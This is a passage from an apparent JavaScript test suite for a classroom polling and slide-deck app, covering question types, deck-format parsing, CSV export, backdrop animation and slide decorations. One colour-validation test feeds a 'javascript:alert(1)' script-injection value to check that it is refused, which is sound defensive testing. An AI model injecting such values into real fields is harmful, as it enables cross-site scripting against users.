    eq(agg.median, 65);           // a mean would be dragged to 59 by the 0
    eq(agg.truth, 70);
    eq(agg.bins[6], 2);           // 60–69
    eq(agg.bins.reduce((s, n) => s + n, 0), 5);
  });

  it('treats a blank answer key as no key at all', () => {
    eq(aggregate('probability', { truth: null }, []).truth, null);
    eq(aggregate('probability', { truth: '' }, []).truth, null);
    eq(aggregate('probability', { truth: 0 }, []).truth, 0);   // 0% is an answer
  });
});

describe('fill in the blank', () => {
  const cfg = { text: 'The [mitochondrion|mitochondria] is the powerhouse of the [cell].' };

  it('parses blanks and their accepted answers out of the sentence', () => {
    const parts = clozeParts(cfg.text);
    eq(parts.filter((p) => p.kind === 'blank').length, 2);
    eq(parts[1].answers.join('|'), 'mitochondrion|mitochondria');
    eq(clozeParts('no blanks here').length, 1);
  });

  it('forgives case and trailing punctuation, but not the wrong word', () => {
    ok(clozeMatches(['cell'], 'Cell.'));
    ok(clozeMatches(['colour', 'color'], 'COLOR'));
    notOk(clozeMatches(['cell'], 'nucleus'));
    notOk(clozeMatches(['cell'], ''));
    notOk(clozeMatches(['cell'], 'Cell', true));      // case-sensitive slide
    eq(clozeMatches([], 'anything'), null);           // unkeyed blank: never wrong
  });

  it('tallies per blank and marks which answers were right', () => {
    const agg = aggregate('cloze', cfg, [
      { payload: { blanks: ['mitochondria', 'cell'] } },
      { payload: { blanks: ['Mitochondria', 'nucleus'] } },
      { payload: { blanks: ['ribosome', 'cell'] } },
    ]);
    eq(agg.total, 3);
    eq(agg.blanks[0].correct, 2);
    eq(agg.blanks[0].answers[0].text, 'mitochondria');
    eq(agg.blanks[0].answers[0].count, 2);
    ok(agg.blanks[0].answers[0].correct);
    eq(Math.round(agg.blanks[1].pct), 67);
    // the sentence travels with the results so the projector can draw it
    eq(agg.parts.filter((p) => p.kind === 'blank').length, 2);
  });

  it('scores partly-right answers as a fraction in the CSV', () => {
    eq(answerCorrectness('cloze', cfg, { blanks: ['mitochondria', 'nucleus'] }), '1/2');
    eq(answerCorrectness('cloze', { text: 'A [] b' }, { blanks: ['x'] }), '');
  });
});

describe('matching pairs', () => {
  const cfg = { pairs: [
    { left: 'Weber', right: 'The Protestant Ethic' },
    { left: 'Durkheim', right: 'Suicide' },
    { left: 'Marx', right: 'Capital' },
  ] };

  it('accepts a full set of matches, and rejects a partial one by default', () => {
    ok(validateResponse('matching', cfg, { matches: [0, 1, 2] }).ok);
    notOk(validateResponse('matching', cfg, { matches: [0, null, null] }).ok);
    ok(validateResponse('matching', { ...cfg, allow_partial: true },
      { matches: [0, null, null] }).ok);
    notOk(validateResponse('matching', cfg, { matches: [9, 9, 9] }).ok);
  });

  it('builds the confusion matrix and names the specific mix-up', () => {
    const agg = aggregate('matching', cfg, [
      { payload: { matches: [0, 1, 2] } },
      { payload: { matches: [1, 0, 2] } },   // Weber ↔ Durkheim swapped
      { payload: { matches: [1, 0, 2] } },
    ]);
    eq(agg.total, 3);
    eq(agg.exact, 1);
    eq(agg.rows[0].correct, 1);
    eq(agg.rows[0].confusedWith.label, 'Suicide');
    eq(agg.rows[0].confusedWith.count, 2);
    eq(agg.rows[2].pct, 100);
    eq(agg.rows[2].confusedWith, null);
  });

  it('marks the answer against the row it was written on', () => {
    eq(answerCorrectness('matching', cfg, { matches: [0, 1, 2] }), '3/3');
    eq(answerCorrectness('matching', cfg, { matches: [1, 0, 2] }), '1/3');
  });
});

describe('timeline order', () => {
  const cfg = { items: ['Treaty signed', 'Border redrawn', 'Election held'] };

  it('takes a full order only, unless partial is allowed', () => {
    ok(validateResponse('timeline', cfg, { order: [2, 0, 1] }).ok);
    notOk(validateResponse('timeline', cfg, { order: [0] }).ok);
    ok(validateResponse('timeline', { ...cfg, allow_partial: true }, { order: [0] }).ok);
    // duplicates are dropped rather than rejected — a phone can only send
    // them by racing itself, and half an order beats a lost answer
    eq(validateResponse('timeline', cfg, { order: [0, 0, 1, 2] }).payload.order.join(','), '0,1,2');
  });

  it('counts where each event was placed, with config order as the key', () => {
    const agg = aggregate('timeline', cfg, [
      { payload: { order: [0, 1, 2] } },
      { payload: { order: [1, 0, 2] } },
    ]);
    eq(agg.total, 2);
    eq(agg.exact, 1);
    eq(agg.items[0].places.join(','), '1,1,0');
    eq(agg.items[2].correct, 2);
    eq(agg.items[2].pct, 100);
    eq(agg.consensus[0].label, 'Treaty signed');
  });
});

describe('exit ticket', () => {
  it('sends on any one of the three, and keeps the columns apart', () => {
    const cfg = defaultConfig('exit_ticket');
    ok(validateResponse('exit_ticket', cfg, { answers: ['', 'why entropy?', ''] }).ok);
    notOk(validateResponse('exit_ticket', cfg, { answers: ['', '', ''] }).ok);

    const agg = aggregate('exit_ticket', cfg, [
      { payload: { answers: ['Borda counts', 'why entropy?', ''] } },
      { payload: { answers: ['', 'what is a warrant?', 'the middle bit'] } },
    ]);
    eq(agg.total, 2);
    eq(agg.columns[0].entries.length, 1);
    eq(agg.columns[1].entries.length, 2);
    eq(agg.columns[2].entries[0].text, 'the middle bit');
    eq(agg.columns[1].label, 'A question you still have');
  });
});

describe('the second wave round-trips the plain-text deck format', () => {
  const src = `# Deck
## traffic
Still with me?
- All good
- Wobbling
- Lost

## this_or_that
Pick a side
- Cats | Dogs
- Tea | Coffee
allow_skip: true

## budget
Fund the semester
- Labs
- Readings
total: 60

## probability
How likely is a recession this year?
truth: 35

## cloze
Fill it in
> The [mitochondrion|mitochondria] is the powerhouse of the [cell].

## matching
Match them up
- Weber | The Protestant Ethic
- Durkheim | Suicide

## timeline
Put these in order
- Treaty signed
- Border redrawn

## exit_ticket
Before you go
- One thing you learned
- A question you still have
- The muddiest point
`;

  it('parses every one of them, with no errors', () => {
    const deck = parseDeck(src);
    eq(deck.errors.length, 0, deck.errors.join('; '));
    eq(deck.questions.length, 8);
    const [tr, tot, bu, pr, cl, ma, ti, ex] = deck.questions;
    eq(tr.config.labels.join(','), 'All good,Wobbling,Lost');
    eq(tot.config.pairs[1].right, 'Coffee');
    eq(tot.config.allow_skip, true);
    eq(bu.config.total, 60);
    eq(pr.config.truth, 35);
    eq(clozeParts(cl.config.text).filter((p) => p.kind === 'blank').length, 2);
    eq(ma.config.pairs[0].right, 'The Protestant Ethic');
    eq(ti.config.items.join(','), 'Treaty signed,Border redrawn');
    eq(ex.config.prompts.length, 3);
  });

  it('serialise → parse survives the pairs, the pot and the answer key', () => {
    const deck = parseDeck(src);
    const again = parseDeck(serialiseDeck({ title: 'Deck', theme: 'lecture-hall' }, deck.questions));
    eq(again.errors.length, 0, again.errors.join('; '));
    const [tr, tot, bu, pr, cl, ma, ti, ex] = again.questions;
    eq(tr.config.labels.join(','), 'All good,Wobbling,Lost');
    eq(tot.config.pairs[0].left, 'Cats');
    eq(bu.config.total, 60);
    eq(pr.config.truth, 35);
    eq(cl.config.text, deck.questions[4].config.text);
    eq(ma.config.pairs[1].left, 'Durkheim');
    eq(ti.config.items.length, 2);
    eq(ex.config.prompts.join('|'), deck.questions[7].config.prompts.join('|'));
  });

  it('says so when a matching pair is missing its other half', () => {
    const bad = parseDeck('# D\n## matching\nMatch\n- Weber | The Protestant Ethic\n- Durkheim\n');
    ok(bad.errors.some((e) => e.includes('both halves')));
  });
});

describe('the second wave stays FERPA-clean in the CSV', () => {
  it('renders a readable cell for every one of them', () => {
    eq(payloadToText('this_or_that', { pairs: [{ left: 'Cats', right: 'Dogs' }] },
      { picks: [1] }), 'Cats vs Dogs=Dogs');
    eq(payloadToText('budget', { options: ['Labs', 'Readings'] }, { alloc: [60, 40] }),
      'Labs=60 | Readings=40');
    eq(payloadToText('timeline', { items: ['A', 'B'] }, { order: [1, 0] }), '1. B ✗ | 2. A ✗');
    eq(payloadToText('exit_ticket', defaultConfig('exit_ticket'),
      { answers: ['Borda', '', ''] }), 'One thing you learned: Borda');
  });

  it('leaves the correctness column empty for everything unkeyed', () => {
    eq(answerCorrectness('mood', {}, { choice: 1 }), '');
    eq(answerCorrectness('traffic', {}, { choice: 0 }), '');
    eq(answerCorrectness('probability', { truth: 50 }, { pct: 50 }), '');
    eq(answerCorrectness('budget', {}, { alloc: [100] }), '');
  });
});

describe('ambience — decorative backdrop motion', () => {
  const plan = (bg, theme = 'lecture-hall') => ambiencePlan(bg, theme);

  it('is off unless a deck asks for it', () => {
    eq(ambienceLevel(undefined), 'off');
    eq(ambienceLevel({ kind: 'theme' }), 'off');
    eq(ambienceLevel({ kind: 'theme', motion: 'nonsense' }), 'off');
    eq(ambienceLevel({ kind: 'theme', motion: 'lively' }), 'lively');
    eq(plan({ kind: 'theme' }).layers.length, 0);
    eq(plan({ kind: 'theme' }).base, null);
  });

  it('never animates the High Contrast theme, whatever the deck says', () => {
    const p = ambiencePlan({ kind: 'theme', motion: 'lively' }, 'high-contrast');
    eq(p.level, 'off');
    eq(p.layers.length, 0);
    eq(p.base, null);
  });

  it('resolves {kind:theme} to the theme\'s own backdrop before choosing motion', () => {
    // Neon Night ships grid-glow, a lattice; Midnight ships aurora, a wash.
    eq(ambiencePlan({ kind: 'theme', motion: 'subtle' }, 'neon-night').kind, 'lattice');
    eq(ambiencePlan({ kind: 'theme', motion: 'subtle' }, 'midnight').kind, 'bloom');
  });

  it('drifts a lattice in pixels, scaled to its own cell', () => {
    const p = plan({ kind: 'preset', id: 'grid', motion: 'subtle' });
    eq(p.kind, 'lattice');
    ok(/px$/.test(p.base.x), `expected a pixel travel, got ${p.base.x}`);
    // one graph-paper cell is 38px; the drift must stay a fraction of it
    // or the pattern reads as scrolling rather than breathing
    ok(parseFloat(p.base.x) < 38 * 0.25, `travel ${p.base.x} is too much of a cell`);
    eq(p.base.scale, [1, 1]);
  });

  it('gives EVERY non-image background blooms, lattices included', () => {
    // The regression this guards: drifting a lattice is invisible,
    // because a uniform repeating pattern is translation-invariant — a
    // dot grid offset by 7px is a dot grid. The blooms passing over it
    // are the only thing anyone can actually see move.
    for (const id of Object.keys(BACKGROUND_PRESETS)) {
      const p = plan({ kind: 'preset', id, motion: 'subtle' });
      eq(p.layers.length, 3, `${id} has no blooms`);
      ok(p.layers.every((l) => parseFloat(l.rotate) !== 0), `${id} blooms do not rotate`);
    }
  });

  it('keeps the backdrop\'s own travel inside the overhang that hides it', () => {
    // styles/ambience.css grows .stage-backdrop.is-drifting by 24px so a
    // drift cannot drag bare --ground into frame. The ceiling has to be
    // applied AFTER the level multiplier or confetti's 340px cell walks
    // straight through it at lively.
    for (const level of ['subtle', 'lively']) {
      for (const id of Object.keys(BACKGROUND_PRESETS)) {
        const p = plan({ kind: 'preset', id, motion: level });
        if (!p.base) continue;
        const travel = Math.max(Math.abs(parseFloat(p.base.x)), Math.abs(parseFloat(p.base.y)));
        ok(travel <= 16, `${id} at ${level} travels ${travel}px past a 16px ceiling`);
      }
    }
  });

  it('blooms over washes, solids and bare grounds', () => {
    for (const bg of [
      { kind: 'preset', id: 'aurora', motion: 'subtle' },
      { kind: 'solid', color: '#123456', motion: 'subtle' },
      { kind: 'none', motion: 'subtle' },
    ]) {
      const p = plan(bg);
      eq(p.kind, 'bloom');
      eq(p.base, null);
      eq(p.layers.length, 3);
      ok(p.layers.every((l) => l.image.includes('radial-gradient')), 'blooms are radials');
    }
  });

  it('gives every bloom layer a co-prime period, so the set never re-syncs', () => {
    const p = plan({ kind: 'preset', id: 'aurora', motion: 'subtle' });
    const periods = p.layers.flatMap((l) => [l.driftDuration, l.breatheDuration]);
    eq(new Set(periods).size, periods.length);
    // and drift never equals breathe on the same layer, or that layer
    // returns to an exact earlier state every cycle
    p.layers.forEach((l) => ok(l.driftDuration !== l.breatheDuration, 'periods differ'));
  });

  it('starts a blurred photo past the blur\'s own scale-up', () => {
    // backgroundStyles() already pushes a blurred image to 1.06 so the
    // smeared edge sits off screen; a Ken Burns that started below that
    // would feather the edge into the room
    const blurred = plan({ kind: 'image', url: 'x.jpg', blur: 12, motion: 'subtle' });
    eq(blurred.kind, 'image');
    ok(blurred.base.scale[0] >= 1.06, `starts at ${blurred.base.scale[0]}`);
    ok(blurred.base.scale[1] > blurred.base.scale[0], 'it has to move');

    const sharp = plan({ kind: 'image', url: 'x.jpg', motion: 'subtle' });
    eq(sharp.base.scale[0], 1);
  });

  it('makes lively travel further and cycle faster than subtle', () => {
    const s = plan({ kind: 'preset', id: 'dots', motion: 'subtle' }).base;
    const l = plan({ kind: 'preset', id: 'dots', motion: 'lively' }).base;
    ok(parseFloat(l.x) > parseFloat(s.x), 'lively travels further');
    ok(l.duration < s.duration, 'lively cycles faster');
  });

  it('keeps bloom alpha inside the range the static presets already use', () => {
    for (const theme of ['midnight', 'lecture-hall']) {
      const p = ambiencePlan({ kind: 'preset', id: 'aurora', motion: 'lively' }, theme);
      p.layers.forEach((l) => {
        const a = Number(/rgba\([^)]*,\s*([\d.]+)\)/.exec(l.image)[1]);
        ok(a > 0 && a <= 0.34, `alpha ${a} on ${theme} is out of range`);
      });
    }
  });
});

describe('ambience round-trips the plain-text deck format', () => {
  it('reads and writes an ambience line independent of the background', () => {
    const d = parseDeck('# Deck\ntheme: midnight\nambience: lively\n\n## poll\nQ?\n- a\n- b\n');
    eq(d.background.kind, 'theme');
    eq(d.background.motion, 'lively');
    ok(serialiseDeck(d, d.questions).includes('ambience: lively'));
  });

  it('merges with the background line whichever order they arrive in', () => {
    const before = parseDeck('# D\nambience: subtle\nbackground: aurora\n');
    eq(before.background, { kind: 'preset', id: 'aurora', motion: 'subtle' });
    const after = parseDeck('# D\nbackground: aurora\nambience: subtle\n');
    eq(after.background, { kind: 'preset', id: 'aurora', motion: 'subtle' });
  });

  it('treats "off" as absent rather than as a stored level', () => {
    const d = parseDeck('# D\nbackground: aurora\nambience: off\n');
    eq(d.background.motion, undefined);
    ok(!serialiseDeck(d, []).includes('ambience'));
  });
});

describe('retyping a slide', () => {
  it('is a no-op when the type has not changed', () => {
    const cfg = { options: ['a', 'b'], chart: 'donut' };
    const r = retypeQuestion('multiple_choice', 'multiple_choice', cfg);
    eq(r.config, cfg);
    eq(r.dropped, []);
  });

  it('carries the list between the list-shaped types', () => {
    // four options become four things to rank — the writing survives
    eq(retypeQuestion('multiple_choice', 'ranking', { options: ['Kant', 'Mill'] })
      .config.items, ['Kant', 'Mill']);
    eq(retypeQuestion('ranking', 'sample_vote', { items: ['A', 'B'] })
      .config.samples, ['A', 'B']);
    eq(retypeQuestion('scales', 'multiple_choice', { statements: ['s1', 's2'] })
      .config.options, ['s1', 's2']);
  });

  it('reports what it had to discard, and never discards it silently', () => {
    const r = retypeQuestion('multiple_choice', 'word_cloud', { options: ['Kant', 'Mill'] });
    eq(r.dropped, ['answer options']);
    eq(r.config, { max_words: 1, max_length: 25 });

    eq(retypeQuestion('heatmap', 'open_ended', { passage: 'A long paragraph.' }).dropped,
      ['the passage']);
    eq(retypeQuestion('instructions', 'quiz', { steps: ['Scan the code'] }).dropped,
      ['join steps']);
  });

  it('says nothing was dropped when the list was still empty', () => {
    // a slide the instructor added but never filled in
    eq(retypeQuestion('multiple_choice', 'word_cloud', { options: ['', ''] }).dropped, []);
    eq(retypeQuestion('heatmap', 'open_ended', { passage: '   ' }).dropped, []);
  });

  it('carries settings the new type still understands, and only those', () => {
    const r = retypeQuestion('multiple_choice', 'quiz',
      { options: ['a', 'b'], confidence: true, chart: 'donut', multiple: true });
    eq(r.config.confidence, true);
    eq(r.config.chart, 'donut');
    // quiz has no "allow several answers" — it must not arrive carrying one
    eq(r.config.multiple, undefined);
  });

  it('does not carry `mode` between types that spell it differently', () => {
    // multiple_choice is opinion/best, heatmap is highlight/classify —
    // same key, different vocabulary, and crossing them strands the
    // slide in a state neither editor can render
    const r = retypeQuestion('multiple_choice', 'heatmap', { mode: 'best', options: ['a'] });
    eq(r.config.mode, 'highlight');
  });

  it('keeps a marked answer key wherever the new type can show one', () => {
    // a quiz already has a right answer in it, and multiple choice has
    // somewhere to put one — landing in "best answer" mode preserves
    // work the instructor sat and did
    const toPoll = retypeQuestion('quiz', 'multiple_choice',
      { options: ['a', 'b'], correct: [1] }).config;
    eq(toPoll.correct, [1]);
    eq(toPoll.mode, 'best');

    eq(retypeQuestion('multiple_choice', 'quiz',
      { options: ['a', 'b'], correct: [1] }).config.correct, [1]);

    // but an unmarked quiz becomes a plain opinion poll, not a "best
    // answer" one with nothing marked
    const unmarked = retypeQuestion('quiz', 'multiple_choice',
      { options: ['a', 'b'], correct: [] }).config;
    eq(unmarked.correct, undefined);
    eq(unmarked.mode, undefined);
  });

  it('drops the answer key where nothing reveals one', () => {
    eq(retypeQuestion('quiz', 'ranking',
      { options: ['a', 'b'], correct: [1] }).config.correct, undefined);
  });

  it('lands every type on a config its own editor can render', () => {
    // every pair, both directions — the guard against a retype that
    // produces a shape nothing downstream knows how to draw
    const types = Object.keys(TYPE_LABELS);
    for (const from of types) {
      for (const to of types) {
        const { config } = retypeQuestion(from, to, defaultConfig(from));
        const fresh = defaultConfig(to);
        for (const key of Object.keys(fresh)) {
          ok(config[key] !== undefined,
            `${from}→${to} lost the required key "${key}"`);
        }
      }
    }
  });
});

describe('chart styles are all real', () => {
  it('offers only styles renderChoice can actually draw', () => {
    // CHART_STYLES drives an icon row, and an icon is a promise. A style
    // listed here that falls through to bars is a control that silently
    // does nothing — which is exactly what `dots` used to do.
    eq(Object.keys(CHART_STYLES).sort(), ['bars', 'columns', 'dots', 'donut'].sort());
    for (const style of Object.keys(CHART_STYLES)) {
      ok(CHART_ICONS[style], `${style} has no icon`);
    }
  });
});

// =====================================================================
describe('slide elements — the catalog', () => {
  it('every element has markup, a label and a home', () => {
    ok(ELEMENT_LIST.length > 200, `only ${ELEMENT_LIST.length} elements`);
    for (const e of ELEMENT_LIST) {
      ok(e.markup && e.markup.includes('<'), `${e.id} has no markup`);
      ok(e.label && e.label.length > 1, `${e.id} has no label`);
      ok(e.category, `${e.id} has no category`);
    }
  });

  it('ids are unique — a duplicate silently loses one to the other', () => {
    const ids = ELEMENT_LIST.map((e) => e.id);
    eq(ids.length, new Set(ids).size, 'duplicate element id');
  });

  it('no element markup carries a hard-coded colour', () => {
    // Colour is applied by elementSvg from theme tokens. A stray fill= or
    // stroke= in the path data would survive re-theming and be the one
    // sticker that stays blue on the chalkboard.
    for (const e of ELEMENT_LIST) {
      ok(!/(?:fill|stroke)="(?!none)(?!currentColor)[^"]*#/.test(e.markup),
        `${e.id} hard-codes a colour`);
    }
  });

  it('finds the obvious thing first', () => {
    eq(searchElements('gavel')[0].id, 'gavel');
    eq(searchElements('microscope')[0].id, 'microscope');
    ok(searchElements('arrow').slice(0, 6).every((e) => /arrow|arc/.test(e.id)));
    eq(searchElements('zzzznope').length, 0);
    eq(searchElements('').length, ELEMENT_LIST.length);
  });

  it('an unknown id is null, not a broken element', () => {
    eq(getElement('no-such-thing'), null);
    notOk(hasElement('no-such-thing'));
    ok(hasElement('microscope'));
  });
});

describe('slide elements — placement', () => {
  it('takes a free position as a percentage of the slide', () => {
    eq(readPos('31.5,68.2'), { x: 31.5, y: 68.2 });
    eq(readPos('50, 50'), { x: 50, y: 50 });
    eq(readPos({ x: 12, y: 90 }), { x: 12, y: 90 });
    eq(readPos('nonsense'), null);
    eq(readPos(''), null);
  });

  it('clamps to the slide and rounds to a tenth', () => {
    // pixels would be tied to one projector; percentages are not, and a
    // tenth of a percent is finer than any eye at the back of a hall
    eq(coord(120), 100);
    eq(coord(-9), 0);
    eq(coord(31.4567), 31.5);
    eq(coord('nope'), null);
    eq(coord('nope', 50), 50);
  });

  it('still understands the names, so old decks keep working', () => {
    // placement used to be a grid of named slots; a deck written then
    // must land in exactly the same place now
    eq(readPos('top-right'), anchorPos('top-right'));
    eq(readPos('center'), { x: 50, y: 50 });
    eq(anchorId('top-right'), 'top-right');
    eq(anchorId('Top Right'), 'top-right');
    eq(anchorId('nowhere'), null);
  });

  it('writes a name back out when it sits exactly on one', () => {
    // so a corner element still reads "@ top-right", not "@ 94,10"
    const p = anchorPos('top-right');
    eq(posName(p.x, p.y), 'top-right');
    eq(posName(50, 50), 'mid-center');
    eq(posName(31.5, 68.2), null);
  });

  it('describes a free position in words', () => {
    eq(posLabel(50, 50), 'centre');
    const free = posLabel(31.5, 68.2);
    ok(free.startsWith('bottom left'), free);
    ok(free.includes('32% across') && free.includes('68% down'), free);
    // a position that lands exactly on a named spot is named, not numbered
    const tr = anchorPos('top-right');
    eq(posLabel(tr.x, tr.y), 'top right');
  });

  it('knows where the projector puts its own furniture', () => {
    // decor draws under both, so this is a warning rather than a ban —
    // but it has to describe real rectangles or the warning never fires
    ok(RESERVED_ZONES.length >= 2);
    for (const z of RESERVED_ZONES) {
      ok(z.x2 > z.x1 && z.y2 > z.y1, `${z.id} is not a rectangle`);
      ok(z.y2 <= 100 && z.x2 <= 100, `${z.id} runs off the slide`);
    }
    ok(reservedAt(95, 95), 'the QR corner must be flagged');
    ok(reservedAt(50, 95), 'the control bar must be flagged');
    eq(reservedAt(50, 20), null);
  });
});

describe('slide elements — paint', () => {
  it('takes theme tokens and hex, and refuses anything else', () => {
    eq(colorId('accent'), 'accent');
    eq(colorId('#1d4ed8'), '#1d4ed8');
    eq(colorId('#ABC'), '#abc');
    eq(colorId('none'), 'none');
    eq(colorId('rebeccapurple'), null);
    eq(colorId('javascript:alert(1)'), null);
    eq(colorId('url(#x)'), null);
  });

  it('resolves a token to a CSS variable so it re-themes', () => {
    eq(colorValue('accent'), 'var(--accent)');
    eq(colorValue('#1d4ed8'), '#1d4ed8');
    eq(colorValue('none'), 'none');
    eq(colorValue('nonsense'), 'none');
  });

  it('every colour token names a real theme variable', () => {
    for (const [, , cssVar] of COLOR_TOKENS) ok(cssVar.startsWith('--'), cssVar);
  });

  it('snaps a stroke weight to one that is offered', () => {
    eq(weightValue(2), 2);
    eq(weightValue('3'), 3);
    eq(weightValue(2.37), 2.5);
    eq(weightValue(99), 4);
    eq(weightValue('fat'), null);
  });

  it('snaps rotation to 15 degrees and wraps it', () => {
    eq(rotValue(15), 15);
    eq(rotValue(17), 15);
    eq(rotValue(-15), 345);
    eq(rotValue(370), 15);
    eq(rotValue('nope'), 0);
  });

  it('keeps opacity visible', () => {
    eq(opacityValue(100), 100);
    eq(opacityValue(0), 5);
    eq(opacityValue(1000), 100);
    eq(opacityValue('nope'), 100);
  });

  it('has a size scale that only grows', () => {
    const vals = Object.values(SIZES);
    for (let i = 1; i < vals.length; i += 1) ok(vals[i] > vals[i - 1], 'sizes must ascend');
    eq(sizeId('LG'), 'lg');
    eq(sizeId('enormous'), null);
  });
});

describe('slide elements — normalising a placed one', () => {
  it('fills in every default from a bare id', () => {
    const home = anchorPos('top-right');
    eq(normaliseDecor({ id: 'star' }), {
      id: 'star', x: home.x, y: home.y, layer: 'front', size: 'md',
      stroke: 'accent', fill: 'none', w: 2, rot: 0, flip: false, op: 100,
    });
  });

  it('drops an element it cannot draw rather than leaving a hole', () => {
    eq(normaliseDecor({ id: 'not-real' }), null);
    eq(normaliseDecor(null), null);
    eq(normaliseDecor('star'), null);
  });

  it('refuses a fill on an open line', () => {
    // An arc has no inside; filling it produces a blob, so the fill is
    // dropped here rather than rendered wrong.
    eq(normaliseDecor({ id: 'mark-arc-right', fill: 'accent' }).fill, 'none');
    eq(normaliseDecor({ id: 'star', fill: 'accent' }).fill, 'accent');
  });

  it('never produces an element with nothing to draw', () => {
    // No stroke and no fill is an invisible element the instructor cannot
    // find or select — one of the two has to hold.
    const item = normaliseDecor({ id: 'star', w: 0, fill: 'none' });
    ok(item.w > 0 || item.fill !== 'none', 'element would be invisible');
  });

  it('caps how much can be piled onto one slide', () => {
    const many = Array.from({ length: 40 }, () => ({ id: 'star' }));
    eq(decorOf({ decor: many }).length, MAX_DECOR);
    eq(decorOf({}), []);
    eq(decorOf(null), []);
    eq(decorOf({ decor: 'not a list' }), []);
  });
});

describe('slide elements — the deck format', () => {
  const parseOne = (line) => {
    const d = parseDeck(`# T\n\n## qa\nQ\n${line}\n`);
    return { item: d.questions[0].config.decor?.[0], errors: d.errors };
  };

  it('reads a bare placement', () => {
    const { item, errors } = parseOne('+ microscope');
    eq(errors, []);
    eq(item.id, 'microscope');
    eq({ x: item.x, y: item.y }, anchorPos('top-right'));
  });

  it('reads a free position, and clamps one that runs off', () => {
    const free = parseOne('+ star @ 31.5,68.2');
    eq(free.errors, []);
    eq({ x: free.item.x, y: free.item.y }, { x: 31.5, y: 68.2 });
    const off = parseOne('+ star @ 120,-9');
    eq({ x: off.item.x, y: off.item.y }, { x: 100, y: 0 });
  });

  it('reads every property, in any order', () => {
    const { item, errors } = parseOne(
      '+ star @ bottom-left xl fill:accent-soft w:3 rot:15 op:70 flip');
    eq(errors, []);
    const bl = anchorPos('bottom-left');
    eq(item, {
      id: 'star', x: bl.x, y: bl.y, layer: 'front', size: 'xl',
      stroke: 'accent', fill: 'accent-soft', w: 3, rot: 15, flip: true, op: 70,
    });
  });

  it('takes "@ top-right" and "@top-right" alike', () => {
    const want = anchorPos('top-right');
    eq({ x: parseOne('+ star @top-right').item.x, y: parseOne('+ star @top-right').item.y }, want);
    eq({ x: parseOne('+ star @ top-right').item.x, y: parseOne('+ star @ top-right').item.y }, want);
  });

  it('treats a bare colour word as the line colour', () => {
    eq(parseOne('+ star accent-2').item.stroke, 'accent-2');
    eq(parseOne('+ star #ff0000').item.stroke, '#ff0000');
  });

  it('names the line and the mistake rather than dropping it quietly', () => {
    ok(parseOne('+ nope-not-real').errors[0].includes('no element called'));
    ok(parseOne('+ star @ nowhere').errors[0].includes('not a place'));
    ok(parseOne('+ star bananas').errors[0].includes("don't know what"));
    ok(parseOne('+ star fill:rebeccapurple').errors[0].includes('not a colour'));
    ok(parseOne('+ mark-arc-right fill:accent').errors[0].includes('open line'));
  });

  it('a "+" line without a slide is not a crash', () => {
    const d = parseDeck('# T\n+ star\n\n## qa\nQ\n');
    ok(Array.isArray(d.questions));
  });

  it('round-trips through text without drifting', () => {
    const src = [
      '# Decor deck', 'theme: chalkboard', '',
      '## multiple_choice', 'Which one?', '- A', '- B',
      '+ microscope @ top-right lg',
      '+ mark-arc-right @ 31.5,68.2 stroke:accent-2 w:3 rot:15 op:70 flip',
      '+ mark-ring @ mid-center', '',
    ].join('\n');

    const first = parseDeck(src);
    eq(first.errors, []);
    const text = serialiseDeck(first, first.questions);
    const second = parseDeck(text);
    eq(second.errors, []);
    eq(second.questions[0].config.decor, first.questions[0].config.decor);
    // and again, so serialise(parse(serialise(x))) is a fixed point
    eq(serialiseDeck(second, second.questions), text);
  });

  it('writes only what differs from the defaults', () => {
    const d = parseDeck('# T\n\n## qa\nQ\n+ star @ top-right\n');
    const text = serialiseDeck(d, d.questions);
    eq(text.match(/^\+ .*$/m)[0], '+ star @ top-right');
    notOk(/w:2|op:100|rot:0/.test(text), 'default values were written out');
  });

  it('leaves slides without elements alone', () => {
    const d = parseDeck(SAMPLE_DECK);
    eq(d.errors, []);
    for (const q of d.questions) eq(q.config.decor, undefined);
    notOk(serialiseDeck(d, d.questions).includes('\n+ '));
  });

  it('will not let a deck file pile on more than a slide can hold', () => {
    const lines = Array.from({ length: 20 }, () => '+ star').join('\n');
    const d = parseDeck(`# T\n\n## qa\nQ\n${lines}\n`);
    eq(d.questions[0].config.decor.length, MAX_DECOR);
    ok(d.errors.some((e) => e.includes(String(MAX_DECOR))));
  });
});

describe('slide elements — layering', () => {
  it('sits in front by default, because a mark points at something', () => {
    eq(DEFAULT_LAYER, 'front');
    eq(normaliseDecor({ id: 'star' }).layer, 'front');
  });

  it('takes "behind" as the word a person would use', () => {
    eq(layerId('behind'), 'back');
    eq(layerId('back'), 'back');
    eq(layerId('front'), 'front');
    eq(layerId('sideways'), null);
    eq(layerId(''), null);
    eq(normaliseDecor({ id: 'star', layer: 'behind' }).layer, 'back');
    eq(normaliseDecor({ id: 'star', layer: 'nonsense' }).layer, 'front');
  });

  it('offers exactly the two layers, each with a reason', () => {
    eq(LAYERS.length, 2);
    for (const [id, label, why] of LAYERS) {
      ok(layerId(id), `${id} is not a layer`);
      ok(label && why, `${id} has no label or explanation`);
    }
  });

  it('round-trips a watermark through the text format', () => {
    const src = ['# T', '', '## qa', 'Q',
      '+ microscope @ center behind xl op:15',
      '+ mark-arc-right @ 31.5,68.2', ''].join('\n');
    const d = parseDeck(src);
    eq(d.errors, []);
    eq(d.questions[0].config.decor.map((i) => i.layer), ['back', 'front']);

    const text = serialiseDeck(d, d.questions);
    ok(text.includes('behind'), text);
    // the default side is never written out
    eq((text.match(/front/g) || []).length, 0);
    eq(parseDeck(text).questions[0].config.decor, d.questions[0].config.decor);
  });

  it('names a bad layer rather than silently fronting it', () => {
    const d = parseDeck('# T\n\n## qa\nQ\n+ star layer:sideways\n');
    ok(d.errors[0].includes('layer'), d.errors[0]);
    eq(d.questions[0].config.decor[0].layer, 'front');
  });
});

// =====================================================================

describe('theme typography is self-hosted', () => {
  // The regression this guards: a theme naming 'Optima' or 'Charter'
  // first renders one way on a Mac, another on Windows and a third on
  // Linux — the same deck, three different lectures. Every family a
  // theme asks for FIRST has to be one we actually ship in fonts/, so
  // the fallbacks after it are insurance against a failed download,
  // never the thing most of the room sees.
  const css = readFileSync(new URL('../styles/fonts.css', import.meta.url), 'utf8');
  const declared = new Set([...css.matchAll(/font-family:\s*'([^']+)'/g)].map((m) => m[1]));
  const files = new Set([...css.matchAll(/url\('\.\.\/fonts\/([^']+)'\)/g)].map((m) => m[1]));
  const firstFamily = (stack) => stack.split(',')[0].trim().replace(/^['"]|['"]$/g, '');

  it('declares every family with both a latin and a latin-ext file', () => {
    ok(declared.size >= 8, `only ${declared.size} families declared`);
    for (const fam of declared) {
      const stem = fam.replace(/[^A-Za-z0-9]/g, '');
      ok(files.has(`${stem}-Variable.woff2`), `${fam} has no latin file`);
